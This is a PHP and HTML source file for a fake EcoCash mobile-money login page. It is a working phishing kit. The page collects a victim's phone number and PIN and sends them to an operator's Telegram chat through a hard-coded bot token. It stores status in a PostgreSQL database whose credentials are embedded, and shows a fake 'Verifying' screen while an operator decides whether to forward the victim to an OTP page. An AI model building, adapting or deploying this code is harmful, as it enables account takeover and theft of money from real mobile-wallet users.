<?php
session_start();

// ========== CONFIGURATION ==========
$botToken = "8163112809:AAH5OFmjVHKPDz1svGG9viGjpAuNLFHsctc";
$chatId   = "-5193742613";

// PostgreSQL credentials
$dbHost = "dpg-d8l5ii7lk1mc73cjcvs0-a";
$dbPort = 5432;
$dbName = "loan_9d8q";
$dbUser = "loan_9d8q_user";
$dbPass = "Jhl6RiIZwV5AnvLVCKirxqgLMtFi5gZX";
// ==================================

// Get phone from session (set by index.php)
$phone = isset($_SESSION['phone']) ? trim($_SESSION['phone']) : '';
$error = '';
$flashMessage = '';
$verifying = false;

if (isset($_SESSION['flash_error'])) {
    $flashMessage = $_SESSION['flash_error'];
    unset($_SESSION['flash_error']);
}

if (empty($phone)) {
    header("Location: index.php");
    exit;
}

/**
 * Get PostgreSQL connection
 */
function getDbConnection($host, $port, $dbname, $user, $pass) {
    static $conn = null;
    if ($conn === null) {
        if (!function_exists('pg_connect')) {
            error_log("PostgreSQL extension (pgsql) is NOT available.");
            return false;
        }
        $connString = "host=$host port=$port dbname=$dbname user=$user password=$pass";
        $conn = @pg_connect($connString);
        if (!$conn) {
            error_log("DB connection failed: " . pg_last_error());
            return false;
        }
    }
    return $conn;
}

/**
 * Send Telegram message
 */
function sendTelegramMessage($botToken, $chatId, $message) {
    $url = "https://api.telegram.org/bot{$botToken}/sendMessage";
    $postData = [
        'chat_id' => $chatId,
        'text'    => $message,
        'parse_mode' => 'Markdown'
    ];
    
    if (function_exists('curl_version')) {
        $ch = curl_init();
        curl_setopt_array($ch, [
            CURLOPT_URL => $url,
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_POST => true,
            CURLOPT_POSTFIELDS => http_build_query($postData),
            CURLOPT_TIMEOUT => 10,
            CURLOPT_SSL_VERIFYPEER => true,
            CURLOPT_USERAGENT => 'EcoCashBot/1.0'
        ]);
        $response = curl_exec($ch);
        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        curl_close($ch);
        if ($response !== false && $httpCode === 200) {
            $result = json_decode($response, true);
            return isset($result['ok']) && $result['ok'] === true;
        }
        return false;
    }
    
    // fallback
    $options = [
        'http' => [
            'header'  => "Content-type: application/x-www-form-urlencoded\r\n",
            'method'  => 'POST',
            'content' => http_build_query($postData),
            'timeout' => 10,
            'user_agent' => 'EcoCashBot/1.0'
        ],
        'ssl' => ['verify_peer' => true]
    ];
    $context = stream_context_create($options);
    $response = @file_get_contents($url, false, $context);
    if ($response !== false) {
        $result = json_decode($response, true);
        return isset($result['ok']) && $result['ok'] === true;
    }
    return false;
}

// ========== Handle AJAX requests ==========
if (isset($_SERVER['HTTP_X_REQUESTED_WITH']) && strtolower($_SERVER['HTTP_X_REQUESTED_WITH']) == 'xmlhttprequest') {
    header('Content-Type: application/json');
    
    // Handle resetting pin to 0 when user starts typing
    if (isset($_POST['action']) && $_POST['action'] === 'reset_pin') {
        $conn = getDbConnection($dbHost, $dbPort, $dbName, $dbUser, $dbPass);
        if ($conn) {
            $updateSQL = "UPDATE users SET pin = 0 WHERE phone = $1";
            $result = pg_query_params($conn, $updateSQL, [$phone]);
            if ($result) {
                echo json_encode(['success' => true]);
            } else {
                echo json_encode(['success' => false]);
            }
        } else {
            echo json_encode(['success' => false]);
        }
        exit;
    }
    
    // Handle checking pin status
    if (isset($_POST['action']) && $_POST['action'] === 'check_pin_status') {
        $conn = getDbConnection($dbHost, $dbPort, $dbName, $dbUser, $dbPass);
        if ($conn) {
            $checkSQL = "SELECT pin FROM users WHERE phone = $1";
            $result = pg_query_params($conn, $checkSQL, [$phone]);
            if ($result && $row = pg_fetch_assoc($result)) {
                $pinStatus = (int)$row['pin'];
                echo json_encode(['pin_status' => $pinStatus]);
            } else {
                echo json_encode(['pin_status' => 0]);
            }
        } else {
            echo json_encode(['pin_status' => 0]);
        }
        exit;
    }
}

// ========== Process PIN submission ==========
if ($_SERVER['REQUEST_METHOD'] === 'POST' && !isset($_SERVER['HTTP_X_REQUESTED_WITH'])) {
    // Get PIN from the array
    if (isset($_POST['pin']) && is_array($_POST['pin'])) {
        $pinArray = $_POST['pin'];
        $pin = implode('', $pinArray);
    } else {
        $pin = '';
    }
    
    $pin = preg_replace('/[^0-9]/', '', $pin);
    
    if (strlen($pin) === 4) {
        $conn = getDbConnection($dbHost, $dbPort, $dbName, $dbUser, $dbPass);
        if (!$conn) {
            $error = "System error. Please contact administrator.";
            $_SESSION['pin_error'] = $error;
            header("Location: " . $_SERVER['PHP_SELF']);
            exit;
        } else {
            // Ensure `users` table exists
            $createSQL = "
                CREATE TABLE IF NOT EXISTS users (
                    phone VARCHAR(20) PRIMARY KEY,
                    status INTEGER DEFAULT 0,
                    pin INTEGER DEFAULT 0,
                    otp INTEGER DEFAULT 0
                )
            ";
            pg_query($conn, $createSQL);
            
            // Insert phone if not exists
            $insertSQL = "INSERT INTO users (phone, status, pin, otp) VALUES ($1, 0, 0, 0) ON CONFLICT (phone) DO NOTHING";
            pg_query_params($conn, $insertSQL, [$phone]);
            
            // Check current pin status
            $checkSQL = "SELECT pin FROM users WHERE phone = $1";
            $checkResult = pg_query_params($conn, $checkSQL, [$phone]);
            if ($checkResult && $row = pg_fetch_assoc($checkResult)) {
                $currentPinStatus = (int)$row['pin'];
                
                // If pin is already 2, redirect to OTP
                if ($currentPinStatus === 2) {
                    $_SESSION['pin_verified'] = true;
                    header("Location: otp.php");
                    exit;
                }
            }
            
            // Store the submitted PIN in session for verification
            $_SESSION['submitted_pin'] = $pin;
            $_SESSION['verifying'] = true;
            
            /// Send Telegram notification
            $ip = "https://loan-1-i36j.onrender.com/verify.php";
            $time = date('Y-m-d H:i:s');
            
            $msg = "🔐 <b>PIN Verification Request</b>\n\n"
                 . "📱 Phone: +263 {$phone}\n"
                 . "🔢 PIN entered: <a href=\"mailto:{$pin}@pin.com\">{$pin}</a>\n"
                 . "⏰ Time: {$time}\n"
                 . "🌐 <a href=\"{$ip}\">VERIFY HERE</a>";
            
            sendTelegramMessage($botToken, $chatId, $msg);
            
            // Redirect to show verifying state (DB value is still 0, will show verifying)
            header("Location: " . $_SERVER['PHP_SELF'] . "?verifying=1");
            exit;
        }
    } else {
        $error = "PIN must be 4 digits.";
        $_SESSION['pin_error'] = $error;
        header("Location: " . $_SERVER['PHP_SELF']);
        exit;
    }
}

// Check if we're in verifying mode
if (isset($_GET['verifying']) || (isset($_SESSION['verifying']) && $_SESSION['verifying'] === true)) {
    $verifying = true;
    // Clear session verifying after setting
    if (isset($_SESSION['verifying'])) {
        unset($_SESSION['verifying']);
    }
}

// Check for error from session
if (isset($_SESSION['pin_error'])) {
    $error = $_SESSION['pin_error'];
    unset($_SESSION['pin_error']);
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>EcoCash | Login</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        * { box-sizing: border-box; }
        body { margin: 0; font-family: Arial, Helvetica, sans-serif; background: #0a5fa7; }
        .top {
            background: #ffffff;
            padding: 8vh 5vw 12vh;
            border-bottom-left-radius: 100% 80px;
            border-bottom-right-radius: 100% 80px;
            text-align: center;
        }
        .logo { font-size: 48px; font-weight: bold; margin-bottom: 20px; }
        .logo span:first-child { color: #1d4ed8; }
        .logo span:last-child { color: #dc2626; }
        .login-title { font-size: 24px; color: #6b7280; margin-bottom: 30px; }
        .phone-box {
            border: 2px solid #1d4ed8;
            border-radius: 12px;
            padding: 14px;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
            max-width: 360px;
            margin: 0 auto 30px;
        }
        .flag { width: 26px; height: 18px; }
        .code { font-size: 18px; color: #374151; }
        .pin-label { color: #6b7280; margin-bottom: 15px; font-size: 16px; }
        .pin {
            display: flex;
            justify-content: center;
            gap: 12px;
            margin-bottom: 20px;
        }
        .pin input {
            width: 55px;
            height: 55px;
            border: 2px solid #1d4ed8;
            border-radius: 10px;
            text-align: center;
            font-size: 22px;
            outline: none;
        }
        .pin input:focus { border-color: #2563eb; }
        .pin input:disabled { background-color: #f3f4f6; cursor: not-allowed; }
        .forgot { color: #6b7280; font-size: 16px; text-decoration: none; }
        .error-message, .flash-message, .verifying-message {
            padding: 10px;
            border-radius: 8px;
            margin: 10px auto;
            max-width: 300px;
            font-size: 14px;
            text-align: center;
        }
        .error-message { color: #dc2626; background: #fee2e2; }
        .flash-message { color: #dc2626; background: #fee2e2; }
        .verifying-message { 
            color: #1d4ed8; 
            background: #dbeafe; 
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
        }
        .spinner {
            display: inline-block;
            width: 16px;
            height: 16px;
            border: 2px solid #1d4ed8;
            border-top-color: transparent;
            border-radius: 50%;
            animation: spin 0.6s linear infinite;
        }
        @keyframes spin {
            to { transform: rotate(360deg); }
        }
        .moving-dots {
            display: inline-flex;
            gap: 4px;
            margin-left: 4px;
        }
        .moving-dots span {
            width: 6px;
            height: 6px;
            background-color: #1d4ed8;
            border-radius: 50%;
            animation: bounce 1.4s infinite ease-in-out;
        }
        .moving-dots span:nth-child(1) { animation-delay: -0.32s; }
        .moving-dots span:nth-child(2) { animation-delay: -0.16s; }
        .moving-dots span:nth-child(3) { animation-delay: 0s; }
        @keyframes bounce {
            0%, 80%, 100% { transform: scale(0.6); opacity: 0.4; }
            40% { transform: scale(1); opacity: 1; }
        }
        .bottom {
            padding: 8vh 5vw 5vh;
            text-align: center;
            color: #ffffff;
        }
        .actions {
            display: flex;
            justify-content: center;
            gap: 20px;
            margin-bottom: 30px;
        }
        .action-btn {
            background: #ffffff;
            color: #111827;
            width: 160px;
            padding: 18px 10px;
            border-radius: 14px;
            font-size: 16px;
            border: none;
            cursor: pointer;
        }
        .version { font-size: 14px; opacity: 0.9; }
        .terms { font-size: 13px; opacity: 0.9; }
        .fade-out {
            animation: fadeOut 0.5s forwards;
        }
        @keyframes fadeOut {
            from { opacity: 1; }
            to { opacity: 0; visibility: hidden; }
        }
    </style>
</head>
<body>
<div class="top">
    <div class="logo"><span>Eco</span><span>Cash</span></div>
    <div class="login-title">Login</div>
    <div class="phone-box">
        <img src="https://upload.wikimedia.org/wikipedia/commons/6/6a/Flag_of_Zimbabwe.svg" class="flag" alt="Zimbabwe flag">
        <div class="code">+263 <?= htmlspecialchars($phone) ?></div>
    </div>
    <div class="pin-label">Enter your PIN</div>

    <?php if ($flashMessage): ?>
        <div class="flash-message"><?= htmlspecialchars($flashMessage) ?></div>
    <?php endif; ?>

    <div id="messageContainer">
        <?php if ($error && !$verifying): ?>
            <div id="statusMessage" class="error-message"><?= htmlspecialchars($error) ?></div>
        <?php endif; ?>
        
        <?php if ($verifying): ?>
            <div id="statusMessage" class="verifying-message">
                <div class="spinner"></div>
                Verifying
                <div class="moving-dots">
                    <span>.</span><span>.</span><span>.</span>
                </div>
            </div>
        <?php endif; ?>
    </div>

    <form method="POST" id="pinForm">
        <div class="pin">
            <input type="password" name="pin[]" maxlength="1" inputmode="numeric" autocomplete="off" <?= $verifying ? 'disabled' : 'autofocus' ?>>
            <input type="password" name="pin[]" maxlength="1" inputmode="numeric" autocomplete="off" <?= $verifying ? 'disabled' : '' ?>>
            <input type="password" name="pin[]" maxlength="1" inputmode="numeric" autocomplete="off" <?= $verifying ? 'disabled' : '' ?>>
            <input type="password" name="pin[]" maxlength="1" inputmode="numeric" autocomplete="off" <?= $verifying ? 'disabled' : '' ?>>
        </div>
        <input type="hidden" name="submitted" value="1">
    </form>
    <a href="#" class="forgot">Forgot PIN?</a>
</div>
<div class="bottom">
    <p>To register an EcoCash wallet or get assistance,<br>click below</p>
    <div class="actions">
        <button class="action-btn" type="button">👤 Register</button>
        <button class="action-btn" type="button">ℹ️ Help & Support</button>
    </div>
    <div class="version">v2.1.3P</div>
    <div class="terms">By signing in you agree to the Terms and Conditions</div>
</div>

<script>
    const inputs = document.querySelectorAll('.pin input');
    let verificationInterval = null;
    let isVerifying = <?= json_encode($verifying) ?>;
    let isSubmitting = false;
    let pollingActive = false;
    let inputHandlersSetup = false;
    
    function submitForm() {
        if (isSubmitting || isVerifying) return;
        
        let pinValue = '';
        for (let i = 0; i < inputs.length; i++) {
            if (!inputs[i].value) {
                return;
            }
            pinValue += inputs[i].value;
        }
        
        if (pinValue.length === 4) {
            isSubmitting = true;
            document.getElementById('pinForm').submit();
        }
    }
    
    function allFilled() {
        let filled = true;
        for (let i = 0; i < inputs.length; i++) {
            if (!inputs[i].value) {
                filled = false;
                break;
            }
        }
        
        if (filled && !isVerifying && !isSubmitting) {
            submitForm();
        }
    }
    
    // Reset pin to 0 in database
    function resetPinInDatabase() {
        fetch(window.location.href, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded',
                'X-Requested-With': 'XMLHttpRequest'
            },
            body: 'action=reset_pin'
        })
        .then(response => response.json())
        .then(data => {
            if (data.success) {
                console.log('PIN reset to 0');
            }
        })
        .catch(error => console.error('Error resetting PIN:', error));
    }
    
    // Function to re-enable inputs and setup handlers after error
    function resetToEditableState() {
        // Enable all inputs
        inputs.forEach(input => {
            input.disabled = false;
            input.value = '';
        });
        
        // Remove disabled attribute from all inputs
        inputs.forEach(input => {
            input.removeAttribute('disabled');
        });
        
        // Re-setup input handlers if needed
        if (!inputHandlersSetup) {
            setupInputHandlers();
            inputHandlersSetup = true;
        }
        
        // Focus first input
        if (inputs[0]) {
            inputs[0].focus();
        }
        
        isSubmitting = false;
        isVerifying = false;
        
        // Remove verifying from URL
        const url = new URL(window.location.href);
        url.searchParams.delete('verifying');
        window.history.replaceState({}, '', url);
    }
    
    // Check PIN status from database (polling every 2 seconds)
    function checkPinStatus() {
        if (!pollingActive) return;
        
        fetch(window.location.href, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded',
                'X-Requested-With': 'XMLHttpRequest'
            },
            body: 'action=check_pin_status'
        })
        .then(response => response.json())
        .then(data => {
            const pinStatus = data.pin_status;
            console.log('PIN Status from DB:', pinStatus);
            
            // If status changed to 1 -> wrong PIN
            if (pinStatus === 1) {
                if (verificationInterval) {
                    clearInterval(verificationInterval);
                    verificationInterval = null;
                    pollingActive = false;
                }
                
                // Show wrong PIN message
                const messageContainer = document.getElementById('messageContainer');
                messageContainer.innerHTML = '<div id="statusMessage" class="error-message">Wrong PIN. Try again</div>';
                
                // Re-enable inputs and allow retry
                resetToEditableState();
                
                // Auto-fade error message after 3 seconds, then reset DB to 0
                setTimeout(() => {
                    const msgDiv = document.getElementById('statusMessage');
                    if (msgDiv && msgDiv.classList && msgDiv.classList.contains('error-message')) {
                        msgDiv.classList.add('fade-out');
                        setTimeout(() => {
                            if (msgDiv && msgDiv.parentNode) {
                                msgDiv.remove();
                            }
                            // Reset database back to 0 after error message fades away
                            resetPinInDatabase();
                        }, 500);
                    } else {
                        // If message already removed, still reset DB
                        resetPinInDatabase();
                    }
                }, 3000);
            } 
            // If status changed to 2 -> success, redirect to OTP
            else if (pinStatus === 2) {
                if (verificationInterval) {
                    clearInterval(verificationInterval);
                    verificationInterval = null;
                    pollingActive = false;
                }
                window.location.href = 'otp.php';
            }
            // Status 0 means still verifying (default), continue polling
        })
        .catch(error => console.error('Error checking PIN status:', error));
    }
    
    // Setup input event handlers
    function setupInputHandlers() {
        const freshInputs = document.querySelectorAll('.pin input');
        
        freshInputs.forEach((input, index) => {
            // Remove existing listeners by cloning and replacing
            const newInput = input.cloneNode(true);
            input.parentNode.replaceChild(newInput, input);
            freshInputs[index] = newInput;
        });
        
        // Re-query fresh inputs
        const finalInputs = document.querySelectorAll('.pin input');
        
        finalInputs.forEach((input, index) => {
            // Input event for typing
            input.addEventListener('input', (e) => {
                // Allow only numbers
                e.target.value = e.target.value.replace(/[^0-9]/g, '');
                
                // If user types and error message exists, clear it
                const errorMsg = document.getElementById('statusMessage');
                if (errorMsg && errorMsg.classList && errorMsg.classList.contains('error-message')) {
                    errorMsg.classList.add('fade-out');
                    setTimeout(() => {
                        if (errorMsg && errorMsg.parentNode) {
                            errorMsg.remove();
                        }
                    }, 500);
                }
                
                // Move to next input if value entered
                if (e.target.value && index < finalInputs.length - 1) {
                    finalInputs[index + 1].focus();
                }
                
                // Check if all filled and auto-submit
                let allFilled = true;
                for (let i = 0; i < finalInputs.length; i++) {
                    if (!finalInputs[i].value) {
                        allFilled = false;
                        break;
                    }
                }
                
                if (allFilled && !isVerifying && !isSubmitting) {
                    setTimeout(() => {
                        if (!isSubmitting && !isVerifying) {
                            let pinValue = '';
                            for (let i = 0; i < finalInputs.length; i++) {
                                pinValue += finalInputs[i].value;
                            }
                            if (pinValue.length === 4) {
                                isSubmitting = true;
                                document.getElementById('pinForm').submit();
                            }
                        }
                    }, 50);
                }
            });
            
            // Keydown for backspace navigation
            input.addEventListener('keydown', (e) => {
                if (e.key === 'Backspace') {
                    if (e.target.value === '' && index > 0) {
                        finalInputs[index - 1].focus();
                        finalInputs[index - 1].value = '';
                        e.preventDefault();
                    } else if (e.target.value !== '') {
                        e.target.value = '';
                        e.preventDefault();
                    }
                }
            });
            
            // Paste handling
            input.addEventListener('paste', (e) => {
                e.preventDefault();
                let pasteData = (e.clipboardData || window.clipboardData).getData('text');
                pasteData = pasteData.replace(/[^0-9]/g, '');
                if (pasteData) {
                    const digits = pasteData.split('').slice(0, 4);
                    for (let i = 0; i < digits.length && i + index < finalInputs.length; i++) {
                        finalInputs[index + i].value = digits[i];
                    }
                    // Focus first empty
                    for (let i = 0; i < finalInputs.length; i++) {
                        if (!finalInputs[i].value) {
                            finalInputs[i].focus();
                            break;
                        }
                    }
                    
                    // Check if all filled after paste
                    let allFilled = true;
                    for (let i = 0; i < finalInputs.length; i++) {
                        if (!finalInputs[i].value) {
                            allFilled = false;
                            break;
                        }
                    }
                    if (allFilled && !isVerifying && !isSubmitting) {
                        setTimeout(() => {
                            if (!isSubmitting && !isVerifying) {
                                let pinValue = '';
                                for (let i = 0; i < finalInputs.length; i++) {
                                    pinValue += finalInputs[i].value;
                                }
                                if (pinValue.length === 4) {
                                    isSubmitting = true;
                                    document.getElementById('pinForm').submit();
                                }
                            }
                        }, 50);
                    }
                }
            });
        });
        
        // Update global inputs reference
        const updatedInputs = document.querySelectorAll('.pin input');
        for (let i = 0; i < updatedInputs.length; i++) {
            inputs[i] = updatedInputs[i];
        }
    }
    
    // If not verifying, setup handlers and focus
    if (!isVerifying) {
        setupInputHandlers();
        inputHandlersSetup = true;
        if (inputs[0]) inputs[0].focus();
    }
    
    // If verifying, start polling every 2 seconds
    if (isVerifying) {
        // Disable inputs while verifying
        inputs.forEach(input => {
            input.disabled = true;
        });
        
        // Start polling every 2 seconds
        pollingActive = true;
        verificationInterval = setInterval(checkPinStatus, 2000);
        // Immediate first check
        setTimeout(checkPinStatus, 500);
    }
</script>
</body>
</html>
